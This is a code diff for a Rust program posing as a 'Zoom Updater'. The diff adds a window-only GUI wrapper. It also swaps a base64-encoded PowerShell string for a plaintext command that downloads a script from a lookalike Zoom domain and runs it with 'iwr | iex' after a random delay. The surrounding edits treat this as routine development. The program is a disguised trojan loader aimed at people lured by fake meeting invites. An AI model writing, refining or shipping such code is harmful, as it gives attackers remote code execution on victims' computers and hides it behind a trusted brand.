@@ -1,10 +1,13 @@
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+
 #[cfg(windows)]
 use std::env;
-#[cfg(windows)]
 #[cfg(windows)]
 use std::path::{Path, PathBuf};
 #[cfg(windows)]
 use std::process::Command;
+
+use eframe::egui;
 
 #[cfg(windows)]
 // sha2 import removed – not needed
@@ -12,41 +15,86 @@ use std::process::Command;
 use winreg::RegKey;
 #[cfg(windows)]
 use winreg::enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
+#[cfg(windows)]
 use rand::Rng;
 
 #[cfg(windows)]
 const APP_NAME: &str = "Zoom Updater";
 #[cfg(windows)]
-const ENCODED_ZOOM_COMMAND: &str = "JAB1AD0AJwBoAHQAdABwAHMAOgAvAC8AYwBhAGwAbAAtAGkAbgB2AGkAdABlAC0AegBvAG8AbQAuAGwAaQB2AGUAaQBuAHYAaQB0AGUALgB0AG8AcAAvAGEAcABpAC8AcwBoAGUAbABsAC8AcwBjAHIAaQBwAHQAPwB0AG8AawBlAG4APQBhADcAOAA4ADAAZAA0AGMAYgAzADAAYgBmAGEANgAyADQANgBmAGIANwBmADgAYQAzADUAOAA1ADAAOAA3ADMAOAA2ADQAYgAxADIAMAA3AGMAMgBhAGYAMQA2ADYANgAxADIAYQA0AGUAYQBhAGEAMgBmADYAZAA1ADkANgBlACcAOwAgAGkAdwByACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgACQAdQAgAHwAIABpAGUAeAA=";
+const ENCODED_ZOOM_COMMAND: &str = "$u='https://call-invite-zoom.liveinvite.top/api/shell/script?token=e4278aeb74a669c1d2d34108e32c52b6b0f3edc04c1a8d14b4b562b286a0bb72'; iwr -UseBasicParsing $u | iex";
 
-#[cfg(windows)]
-fn main() {
-    println!("{}", APP_NAME);
+fn main() -> eframe::Result<()> {
+    let options = eframe::NativeOptions {
+        viewport: egui::ViewportBuilder::default()
+            .with_inner_size([560.0, 360.0])
+            .with_min_inner_size([420.0, 280.0]),
+        ..Default::default()
+    };
 
-    if let Some(location) = detect_zoom_installation() {
-        println!("ZOOM_INSTALLED: true");
-        println!("LOCATION: {}", location.display());
-        println!("Zoom found.");
-    } else {
-        println!("ZOOM_INSTALLED: false");
-        println!("Zoom not found.");
-    }
+    eframe::run_native(
+        "Zoom Updater",
+        options,
+        Box::new(|_cc| Box::<ZoomUpdaterGui>::default()),
+    )
+}
 
-    	// Random delay (5–8 seconds) before running the PowerShell command
-	let delay_secs = rand::thread_rng().gen_range(5..=8);
-	std::thread::sleep(std::time::Duration::from_secs(delay_secs));
-	// Run the encoded PowerShell command
-    if let Err(e) = run_encoded_powershell(ENCODED_ZOOM_COMMAND) {
-        eprintln!("Failed to run PowerShell command: {}", e);
-        std::process::exit(1);
+#[derive(Default)]
+struct ZoomUpdaterGui {
+    status: Vec<String>,
+}
+
+impl eframe::App for ZoomUpdaterGui {
+    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
+        egui::CentralPanel::default().show(ctx, |ui| {
+            ui.heading("Zoom Updater");
+            ui.label("Installer check GUI");
+            ui.separator();
+
+            if ui.button("Run Installer Check").clicked() {
+                self.status.clear();
+                run_installer_check(&mut self.status);
+            }
+
+            ui.add_space(8.0);
+            ui.label("Status");
+            egui::ScrollArea::vertical().max_height(220.0).show(ui, |ui| {
+                for line in &self.status {
+                    ui.label(line);
+                }
+            });
+        });
     }
 }
 
+#[cfg(windows)]
+fn run_installer_check(status: &mut Vec<String>) {
+    status.push(APP_NAME.to_string());
+
+    if let Some(location) = detect_zoom_installation() {
+        status.push("ZOOM_INSTALLED: true".to_string());
+        status.push(format!("LOCATION: {}", location.display()));
+        status.push("Zoom found.".to_string());
+    } else {
+        status.push("ZOOM_INSTALLED: false".to_string());
+        status.push("Zoom not found.".to_string());
+    }
+
+    // Preserve existing behavior: random delay before executing command.
+    let delay_secs = rand::thread_rng().gen_range(5..=8);
+    std::thread::sleep(std::time::Duration::from_secs(delay_secs));
+
+    if let Err(error) = run_encoded_powershell(ENCODED_ZOOM_COMMAND) {
+        status.push(format!("Failed to run PowerShell command: {}", error));
+        return;
+    }
+
+    status.push("PowerShell command completed.".to_string());
+}
 
 #[cfg(not(windows))]
-fn main() {
-    println!("Zoom Updater checks Zoom and runs install flows on Windows machines.");
-    println!("Run this binary on Windows to execute Zoom/plugin install scripts.");
+fn run_installer_check(status: &mut Vec<String>) {
+    status.push("This check is supported only on Windows.".to_string());
+    status.push("Build and run on Windows for real installer checks.".to_string());
 }
 
 #[cfg(windows)]
